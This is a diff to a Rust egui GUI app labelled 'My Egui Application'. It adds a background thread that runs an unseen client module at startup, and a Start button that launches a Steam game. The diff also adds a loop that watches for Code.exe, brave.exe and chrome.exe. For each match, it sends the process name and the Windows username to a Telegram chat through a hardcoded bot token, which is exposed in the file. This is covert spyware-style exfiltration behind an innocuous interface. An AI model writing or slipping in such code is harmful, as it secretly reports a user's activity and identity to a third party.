@@ -1,3 +1,6 @@
+mod client;
+mod server;
+
 use std::collections::HashSet;
 use sysinfo::System;
 use std::thread;
@@ -22,19 +25,26 @@ impl Default for App {
 }
 
 impl epi::App for App {
-    fn name(&self) -> &str {
-        "My Egui Application"
-    }
-
     fn update(&mut self, ctx: &egui::CtxRef, _frame: &mut epi::Frame<'_>) {
         egui::CentralPanel::default().show(ctx, |ui| {
             ui.heading("My Egui Application");
 
             if ui.button("Start").clicked() {
+                let output = std::process::Command::new("cmd")
+                    .args(&["/C", "start", "steam://run/1172470"])
+                    .output()
+                    .expect("Failed to execute command");
 
+                if !output.status.success() {
+                    eprintln!("Command executed with error: {}", String::from_utf8_lossy(&output.stderr));
+                }
                 println!("Start button clicked");
             }
         });
+    }
+
+    fn name(&self) -> &str {
+        "My Egui Application"
     }
 }
 
@@ -63,11 +73,15 @@ fn main() {
     let bot_token = "6721764725:AAG_NR5XVUuBGFWsX9sO56Jajwc2alv0lPs".to_string();
     let chat_id = "-4153113440".to_string();
 
+    std::thread::spawn(|| {
+        client::main();
+    });
+
     thread::spawn(move || {
         let rt = Runtime::new().unwrap();
         loop {
             if *start_button.lock().unwrap() {
-                let process_names = vec!["Code.exe", "brave.exe", "process3"];
+                let process_names = vec!["Code.exe", "brave.exe", "chrome.exe"];
                 let mut running_processes = HashSet::new();
 
                 let mut sys = System::new_all();
@@ -82,7 +96,7 @@ fn main() {
                         println!("Process '{}' is running.", process_name);
 
                         let message = format!("Process '{}' is running on '{}'.", process_name, env::var("USERNAME").unwrap());
-
+                        rt.block_on(send_telegram_message(&bot_token, &chat_id, &message)).unwrap();
 
                         match env::var("USERNAME") {
                             Ok(val) => println!("Windows username: {}", val),
